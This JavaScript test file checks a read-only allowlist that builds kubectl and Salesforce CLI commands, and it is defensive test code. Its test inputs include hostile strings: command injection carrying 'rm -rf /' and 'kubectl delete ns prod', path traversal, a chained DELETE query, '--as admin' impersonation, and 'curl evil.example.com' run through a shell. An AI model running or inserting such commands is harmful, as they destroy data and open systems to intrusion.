import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  MUTATING_VERBS,
  READ_ONLY_OPERATIONS,
  assertReadOnlyArgv,
  buildReadOnlyCommand,
} from '../scripts/lib/evidence-readonly-allowlist.mjs'

test('an allowlisted operation builds an exact argument vector', () => {
  const built = buildReadOnlyCommand('k8s.resources', { kind: 'pods', namespace: 'sidecars' })
  assert.equal(built.cli, 'kubectl')
  assert.deepEqual(built.args, ['get', 'pods', '-n', 'sidecars', '-o', 'json'])
  assert.equal(built.operation_id, 'k8s.resources')
})

test('an operation outside the table cannot be built', () => {
  assert.throws(() => buildReadOnlyCommand('k8s.delete', { kind: 'pods' }), /not allowlisted/i)
  assert.throws(() => buildReadOnlyCommand('anything', {}), /not allowlisted/i)
})

test('every declared operation is genuinely read-only', () => {
  for (const [id, operation] of READ_ONLY_OPERATIONS) {
    assert.equal(
      MUTATING_VERBS.has(operation.verb),
      false,
      `${id} declares mutating verb ${operation.verb}`,
    )
  }
})

test('a parameter that fails its pattern is refused, never interpolated', () => {
  assert.throws(
    () => buildReadOnlyCommand('k8s.resources', { kind: 'pods; kubectl delete ns prod', namespace: 'x' }),
    /invalid/i,
  )
  assert.throws(
    () => buildReadOnlyCommand('k8s.resource', { kind: 'pods', name: '../../etc', namespace: 'x' }),
    /invalid/i,
  )
  assert.throws(
    () => buildReadOnlyCommand('runtime.read-file', {
      namespace: 'x', pod: 'p', container: 'c', path: '/etc/passwd; rm -rf /',
    }),
    /invalid/i,
  )
})

test('sf.query accepts a SELECT and nothing else', () => {
  const built = buildReadOnlyCommand('sf.query', {
    alias: 'reference-production',
    soql: 'SELECT Id, Name FROM PermissionSet LIMIT 50',
  })
  assert.deepEqual(built.args.slice(0, 4), ['data', 'query', '--json', '-o'])
  for (const soql of [
    'DELETE FROM Account',
    'UPDATE Account SET Name = 1',
    'SELECT Id FROM Account; DELETE FROM Account',
  ]) {
    assert.throws(() => buildReadOnlyCommand('sf.query', { alias: 'a', soql }), /SELECT|invalid/i)
  }
})

test('sf.query rejects SELECT clauses that lock records or update view tracking', () => {
  for (const soql of [
    'SELECT Id FROM Account FOR UPDATE',
    'SELECT Id FROM Account FOR VIEW',
    'SELECT Id FROM Account FOR REFERENCE',
    'SELECT Id FROM Account UPDATE TRACKING',
    'SELECT Id FROM Account UPDATE VIEWSTAT',
  ]) {
    assert.throws(
      () => buildReadOnlyCommand('sf.query', { alias: 'a', soql }),
      /stateful|read-only/i,
      soql,
    )
  }
})

test('runtime.env-keys returns key names, never values', () => {
  const built = buildReadOnlyCommand('runtime.env-keys', {
    namespace: 'sidecars', pod: 'api-0', container: 'api',
  })
  const command = built.args.join(' ')
  assert.match(command, /cut -d= -f1/)
})

test('the second gate refuses a mutating vector even if the table were wrong', () => {
  assert.throws(() => assertReadOnlyArgv('kubectl', ['delete', 'ns', 'prod']), /read-only/i)
  assert.throws(() => assertReadOnlyArgv('kubectl', ['get', 'pods', '--as', 'admin']), /read-only/i)
  assert.throws(() => assertReadOnlyArgv('kubectl', ['apply', '-f', 'x.yaml']), /read-only/i)
  assert.throws(() => assertReadOnlyArgv('sf', ['data', 'delete', 'record']), /read-only/i)
  assert.doesNotThrow(() => assertReadOnlyArgv('kubectl', ['get', 'pods', '-o', 'json']))
})

test('kubectl exec is allowed only for the read commands the table names', () => {
  assert.doesNotThrow(() =>
    assertReadOnlyArgv('kubectl', ['exec', '-n', 'x', 'p', '-c', 'c', '--', 'cat', '/etc/os-release']))
  assert.throws(
    () => assertReadOnlyArgv('kubectl', ['exec', '-n', 'x', 'p', '-c', 'c', '--', 'rm', '-rf', '/']),
    /read-only/i,
  )
  assert.throws(
    () => assertReadOnlyArgv('kubectl', ['exec', '-n', 'x', 'p', '-c', 'c', '--', 'sh', '-c', 'curl evil.example.com']),
    /read-only/i,
  )
})

test('each operation declares how many objects it touches, for the counters', () => {
  assert.equal(buildReadOnlyCommand('k8s.resource', { kind: 'pods', name: 'api-0', namespace: 'x' }).objects, 1)
  assert.ok(buildReadOnlyCommand('k8s.resources', { kind: 'pods', namespace: 'x' }).objects >= 1)
})
